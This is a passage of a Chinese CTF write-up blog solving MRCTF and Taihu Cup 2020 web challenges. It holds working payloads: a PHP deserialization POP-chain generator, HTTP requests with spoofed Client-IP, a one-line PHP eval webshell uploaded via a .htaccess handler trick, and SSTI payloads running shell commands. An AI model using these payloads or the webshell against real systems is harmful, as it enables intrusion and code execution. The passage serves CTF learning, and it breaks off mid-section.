&#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line"><span class="meta">    @unserialize($_GET[&#x27;pop&#x27;]);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>反序列化直接分析，构造pop链，分析一下三个类。</p>
<h4 id="Modifier类"><a href="#Modifier类" class="headerlink" title="Modifier类"></a><strong>Modifier类</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>include</code>函数，文件包含漏洞，我们可以使用伪协议读取注释中flag.php中的内容。</p>
<p>这里有魔法方法<code>__invoke</code>当脚本尝试将对象调用为函数时触发，所以在脚本中，要把Modifier类调用为函数。</p>
<h4 id="Show类"><a href="#Show类" class="headerlink" title="Show类"></a><strong>Show类</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=<span class="string">&#x27;index.php&#x27;</span>)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>__construct</code>方法，接收参数<code>$file</code>，<code>$this-&gt;source = $file</code>将<code>$file</code>的值赋给<code>source</code>。而<code>$file</code>的值直接就是<code>index.php</code>，所以还是输出<code>index.php</code>。</li>
<li><code>__toString</code>方法，当前对象访问<code>str</code>再访问<code>source</code>，然后返回这个值，就是把类当作字符串使用时触发。</li>
<li><code>__wakeup</code>方法，使用反序列化的时候触发，过滤一些协议，但是显而易见可以用<code>filter</code>。</li>
</ul>
<h4 id="Test类"><a href="#Test类" class="headerlink" title="Test类"></a><strong>Test类</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>__construct</code>方法，把p对象变成一个数组。</li>
<li><code>__get</code>方法，从不可访问的属性中读取数据会触发。</li>
</ul>
<p>然后开始构造pop链：</p>
<p>因为最终是想调用文件包含函数，读取flag.php。所以要触发<code>__invoke</code>。</p>
<p>而<code>__get</code>将对象p作为函数调用，将p实例化为<code>Modifier</code>类，从而触发<code>__invoke</code>。</p>
<p>然后<code>__toString</code>访问<code>str</code>的<code>source</code>属性，如果将str实例化为Test，因为Test类中不含source属性，从而触发<code>__get</code>方法。</p>
<p><code>__wakeup</code>把对象当成字符串处理(做匹配的时候)，触发<code>__toString</code>。</p>
<p>最后是反序列化触发<code>__wakeup</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)&#123;</span><br><span class="line">    $this-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Show(<span class="string">&#x27;abc&#x27;</span>);</span><br><span class="line">$a-&gt;str = new Test();</span><br><span class="line">$a-&gt;str-&gt;p = new Modifier();</span><br><span class="line">$b = new Show($a);//将字符串打印出来</span><br><span class="line">echo urlencode(serialize($b));</span><br></pre></td></tr></table></figure>

<p>然后得到的是一串base64，解码即可得到flag。</p>
<h3 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a><strong>套娃</strong></h3><p>F12查看到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$query = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span>( substr_count($query, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">      die(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">if</span>($_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, $_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">      echo <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>首先是对字符串的下划线进行统计，如果大于0就直接die()</p>
<p>但是下面需要接收一个包含下划线的参数b_u_p_t，而且它不能等于23333而正则匹配却要有23333。这里直接用%0a可以绕过。而php参数，空格和点都会变成下划线_。</p>
<p><strong>payload</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://ecf196f2-c27e-427a-aecc-31e4ee6a3a28.merak-ctf.site/?b.u.p.t=23333%0a</span><br></pre></td></tr></table></figure>

<p>得到secrettw.php文件名。</p>
<p>右键看源码存在一个jsfuck，直接丢谷歌浏览器解码得 <code>post me Merak</code>。</p>
<p>post提交Merak得源码</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> error_reporting(<span class="number">0</span>); </span><br><span class="line"> include <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line"> ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"> include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"> <span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">     highlight_file(__FILE__); </span><br><span class="line">     die(); </span><br><span class="line"> &#125; </span><br><span class="line"> function change($v)&#123; </span><br><span class="line">     $v = base64_decode($v); </span><br><span class="line">     $re = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">     <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">         $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">     &#125; </span><br><span class="line">     <span class="keyword">return</span> $re; </span><br><span class="line"> &#125;</span><br><span class="line"> echo <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"> $ip = getIp();</span><br><span class="line"> <span class="keyword">if</span>($ip!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"> echo <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.$ip;</span><br><span class="line"> <span class="keyword">if</span>($ip === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents($_GET[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"> echo <span class="string">&quot;Your REQUEST is:&quot;</span>.change($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"> echo file_get_contents(change($_GET[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"> ?&gt;  </span><br></pre></td></tr></table></figure>

<p>绕过IP的方法<code>Client-IP: 127.0.0.1</code>，使用data协议去绕过<code>file_get_contents</code>。</p>
<p>逆向change函数</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function dechange($v)&#123;</span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($re);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo dechange(<span class="string">&#x27;todat is a happy day&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GET /secrettw.php?2333=data:text/html;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&amp;file=ZmpdYSZmXGI= HTTP/1.1</span><br><span class="line">Host: <span class="number">17409</span>a10<span class="number">-8159</span><span class="number">-4621</span>-ac69<span class="number">-576</span>be7b7bd12.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">76.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">76.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Client-IP: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>

<h3 id="PYwebsite"><a href="#PYwebsite" class="headerlink" title="PYwebsite"></a>PYwebsite</h3><p>XFF绕过</p>
<h3 id="ez-bypass"><a href="#ez-bypass" class="headerlink" title="ez_bypass"></a>ez_bypass</h3><p>源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$flag=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;isset($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        echo <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     die(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     echo <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                echo <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure>

<p>第一层的md5用数组绕过，<code>?gg[]=1&amp;id[]=2</code>，第二层passwd是1234567a。</p>
<h3 id="你传你🐎呢"><a href="#你传你🐎呢" class="headerlink" title="你传你🐎呢"></a>你传你🐎呢</h3><p>改<code>Content-Type: image/png</code>，然后传个<code>.hatccess</code>，内容为：</p>
<p>SetHandler application/x-httpd-php</p>
<p>再传个图片马过去<code>1.jpg</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;cmd&#39;]) ?&gt;</span><br></pre></td></tr></table></figure>

<p>蚁剑连接即可</p>
<h3 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h3><p>使用dirsearch</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd Documents/dirsearch</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -u <span class="string">&quot;url&quot;</span> -e *</span><br></pre></td></tr></table></figure>

<p>扫目录扫到<a href="http://www.zip/">www.zip</a></p>
<p>源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">&#x27;&#x27;</span>) || ($password == <span class="string">&#x27;&#x27;</span>) ||($Private_key == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        // 若为空,视为未填写,提示错误,并<span class="number">3</span>秒后返回登录界面</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        echo <span class="string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        exit;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        echo <span class="string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">        $link=mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        mysql_select_db(<span class="string">&quot;test&quot;</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">// genarate public_key</span><br><span class="line">function public_key($length = <span class="number">16</span>) &#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //genarate private_key</span><br><span class="line">  function private_key($length = <span class="number">12</span>) &#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  //$Public_key = KVQP0LdJKRaV3n9D  how to get crisp<span class="string">r&#x27;s private_key???</span></span><br></pre></td></tr></table></figure>

<p>随机数种子问题，用脚本将公钥整理成php_mt_rand的格式，脚本如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span><br><span class="line">$str = <span class="string">&quot;KVQP0LdJKRaV3n9D&quot;</span>;</span><br><span class="line">$randStr = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">$pos = strpos($randStr,$str[$i]);</span><br><span class="line">echo $pos.<span class="string">&quot; &quot;</span>.$pos.<span class="string">&quot; &quot;</span>.<span class="string">&quot;0 &quot;</span>.(strlen($randStr)<span class="number">-1</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">42</span> <span class="number">42</span> <span class="number">0</span> <span class="number">61</span> <span class="number">41</span> <span class="number">41</span> <span class="number">0</span> <span class="number">61</span> <span class="number">52</span> <span class="number">52</span> <span class="number">0</span> <span class="number">61</span> <span class="number">37</span> <span class="number">37</span> <span class="number">0</span> <span class="number">61</span> <span class="number">3</span> <span class="number">3</span> <span class="number">0</span> <span class="number">61</span> <span class="number">35</span> <span class="number">35</span> <span class="number">0</span> <span class="number">61</span> <span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">43</span> <span class="number">43</span> <span class="number">0</span> <span class="number">61</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">55</span> <span class="number">55</span> <span class="number">0</span> <span class="number">61</span> <span class="number">13</span> <span class="number">13</span> <span class="number">0</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">0</span> <span class="number">61</span> <span class="number">29</span> <span class="number">29</span> <span class="number">0</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>

<p>还原成种子为：1775196155</p>
<p>接下来还原密钥即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"></span><br><span class="line">function public_key($length = <span class="number">16</span>) &#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    &#123;</span><br><span class="line">        echo mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>).<span class="string">&quot;---&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   function private_key($length = <span class="number">12</span>) &#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">echo public_key();</span><br><span class="line">echo private_key();</span><br></pre></td></tr></table></figure>

<p>然后进login.html</p>
<p>输入万能密码和密钥和用户名crispr即可。</p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>太湖杯 2020</title>
    <url>/2020/11/14/%E5%A4%AA%E6%B9%96%E6%9D%AF/</url>
    <content><![CDATA[<p>复盘一下不久前的太湖杯的web&amp;misc<a id="more"></a></p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="checkInGame"><a href="#checkInGame" class="headerlink" title="checkInGame"></a>checkInGame</h3><p>进去之后是一个连连看的画面，倒计时40秒完成即可获得flag</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201108092621281.png" alt="image-20201108092621281"></p>
<p>试了几次发现时间完全不够，当然连连看高手除外，正确做法是：</p>
<p>审查40这个元素打断点，然后把view.js里面那一句删除即可停止时间</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201108092959671.png" alt="image-20201108092959671"></p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201108092913542.png" alt="image-20201108092913542"></p>
<p>慢慢连完即可得到flag</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201108092601380.png" alt="image-20201108092601380"></p>
<h3 id="easyWeb"><a href="#easyWeb" class="headerlink" title="easyWeb"></a>easyWeb</h3><p>进入题目界面如下</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107211736799.png" alt="image-20201107211736799"></p>
<p>随便抓个包发现是python</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107211815382.png" alt="image-20201107211815382"></p>
<p>知道大概是SSIT，但是过滤了<code>&#123;</code>和<code>&#125;</code>。</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107211926347.png" alt="image-20201107211926347"></p>
<p>在这个网站寻找绕过的Unicode字符，网址如下：<a href="https://www.compart.com/en/unicode/U+FE38">传送门</a>，直接在网址搜索<code>&#123;</code>，就会出现类似的字符，就可以找到<code>︷</code>了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">︷︷config︸︸</span><br></pre></td></tr></table></figure>

<p>成功回显</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107233731092.png" alt="image-20201107233731092"></p>
<p>接下来直接用常规的ssit的payload打一下即可，然后发现过滤了引号，用request.args绕一下即可。</p>
<p>payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%EF%B8%B7%EF%B8%B7().__class__.__bases__[0].__subclasses__()[375].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()%EF%B8%B8%EF%B8%B8</span><br></pre></td></tr></table></figure>

<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201108093620236.png" alt="image-20201108093620236"></p>
<p>除了上面的方法之外，还看到有师傅用Unicode字符绕过的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">｛	&amp;#65371;</span><br><span class="line">｝	&amp;#65373;</span><br><span class="line">［	&amp;#65339;</span><br><span class="line">］	&amp;#65341;</span><br><span class="line">＇	&amp;#65287;</span><br><span class="line">＂	&amp;#65282;</span><br></pre></td></tr></table></figure>

<p>payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">｛｛url_for.__globals__［＇__builtins__＇］［＇eval＇］（＇__import__（＂os＂）.popen（＂cat &#x2F;flag＂）.read（）＇）｝｝ </span><br></pre></td></tr></table></figure>

<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201109164326501.png" alt="image-20201109164326501"></p>
<h3 id="CrossFire"><a href="#CrossFire" class="headerlink" title="CrossFire"></a>CrossFire</h3><p>题目有给出两个hint</p>
<ul>
<li>存在注入点</li>
<li>目录穿越</li>
</ul>
<p>首先发现有一个id参数可以输入，但是输入1和0的回显不一样。</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107221746512.png" alt="image-20201107221746512"></p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107221800783.png" alt="image-20201107221800783"></p>
<p>测试一下if语句行不行，发现可行，以此为基础写sql盲注脚本。</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107221952821.png" alt="image-20201107221952821"></p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107222008777.png" alt="image-20201107222008777"></p>
<p>用祖传的二分法脚本跑一下，发现可以跑出数据库</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107222255655.png" alt="image-20201107222255655"></p>
<p>然后可以使用<code>load_file</code>函数去读他的一个源码，读取index.php。</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107233227559.png" alt="image-20201107233227559"></p>
<p>这里读取的时间有点点久，慢慢等就好了，这里贴一下index.php的源码</p>
